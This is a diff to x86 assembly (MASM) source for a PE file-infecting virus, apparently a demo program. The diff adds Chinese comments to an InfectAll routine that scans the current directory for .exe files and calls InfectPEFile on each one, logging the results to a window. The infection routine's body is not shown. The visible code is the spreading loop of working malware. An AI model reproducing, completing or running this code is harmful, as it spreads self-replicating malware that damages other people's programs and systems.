@@ -410,7 +410,7 @@ InfectPEFile proc
 InfectPEFile endp
 
 ;************************************************************************************************************
-;
+;感染当前目录所有可执行文件
 ;************************************************************************************************************
 fmt db "%s %d",0dh,0ah,0
 wcard db "*.exe",0
@@ -421,12 +421,15 @@ InfectAll proc
 	local	wfd:WIN32_FIND_DATA
 	local	hSearch:dword
 
+	;输出提示信息
 	invoke	GetWindowTextLength,hEdit
 	invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
 	invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr msg
 
+	;查找当前目录的第一个exe文件
 	invoke FindFirstFile,addr wcard,addr wfd
 	.if eax == INVALID_HANDLE_VALUE
+		;没有找到，输出错误信息并返回
 		invoke	GetWindowTextLength,hEdit
 		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
 		invoke	SendMessage,hEdit,EM_REPLACESEL,0,addr notfound
@@ -435,9 +438,12 @@ InfectAll proc
 		mov hSearch,eax
 	.endif
 
+	;如果不是目录，是文件
 	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		;感染文件
 		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
 		invoke	InfectPEFile
+		;输出文件名和感染结果
 		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
 		invoke	GetWindowTextLength,hEdit
 		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
@@ -445,12 +451,17 @@ InfectAll proc
 	.endif
 
 nextfile:
+	;查找下一个文件
 	invoke FindNextFile,hSearch,ADDR wfd
+	;没找到则结束
 	cmp eax,0
 	je InfectAllEnd
+	;如果不是目录，是文件
 	.if !(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		;感染文件
 		invoke	lstrcpy,addr szFileName,addr wfd.cFileName
 		invoke	InfectPEFile
+		;输出文件名和感染结果
 		invoke	wsprintf,addr szBuffer,offset fmt,addr wfd.cFileName,eax
 		invoke	GetWindowTextLength,hEdit
 		invoke	SendMessage,hEdit,EM_SETSEL,eax,eax
